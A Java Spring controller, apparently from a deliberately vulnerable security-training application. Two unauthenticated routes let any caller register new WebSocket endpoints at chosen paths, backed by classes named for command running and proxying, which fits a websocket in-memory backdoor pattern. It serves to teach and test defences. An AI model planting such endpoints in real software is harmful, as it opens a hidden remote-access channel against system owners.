package org.joychou.controller;

import org.apache.tomcat.websocket.server.WsServerContainer;
import org.joychou.config.WebSocketsProxyEndpoint;
import org.joychou.config.WebSocketsRunEndpoint;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.servlet.ServletContext;
import javax.servlet.http.HttpServletRequest;
import javax.websocket.server.ServerContainer;
import javax.websocket.server.ServerEndpointConfig;


@RestController
public class RealtimeChannel {

    
    @RequestMapping("/websocket/run")
    public String registerRunEndpoint(HttpServletRequest req) {
        String path = req.getParameter("path");
        if (path == null) {
            return "path is null";
        }
        ServletContext sc = req.getServletContext();
        try {
            ServerEndpointConfig sec = ServerEndpointConfig.Builder.create(WebSocketsRunEndpoint.class, path).build();
            WsServerContainer wsc = (WsServerContainer) sc.getAttribute(ServerContainer.class.getName());
            if (wsc.findMapping(path) == null) {
                wsc.addEndpoint(sec);
                System.out.println("[+] Websocket registered: " + path);
                return "[+] Websocket registered: " + path;
            } else {
                System.out.println("[-] Websocket already registered: " + path);
                return "[-] Websocket already registered: " + path;
            }
        } catch (Exception e) {
            return e.toString();
        }
    }

    @RequestMapping("/websocket/proxy")
    public String registerProxyEndpoint(HttpServletRequest req) {
        String path = req.getParameter("path");
        if (path == null) {
            return "path is null";
        }
        ServletContext sc = req.getServletContext();
        try {
            ServerEndpointConfig sec = ServerEndpointConfig.Builder.create(WebSocketsProxyEndpoint.class, path).build();
            WsServerContainer wsc = (WsServerContainer) sc.getAttribute(ServerContainer.class.getName());
            if (wsc.findMapping(path) == null) {
                wsc.addEndpoint(sec);
                System.out.println("[+] Websocket registered: " + path);
                return "[+] Websocket registered: " + path;
            } else {
                System.out.println("[-] Websocket already registered: " + path);
                return "[-] Websocket already registered: " + path;
            }
        } catch (Exception e) {
            return e.toString();
        }
    }

}
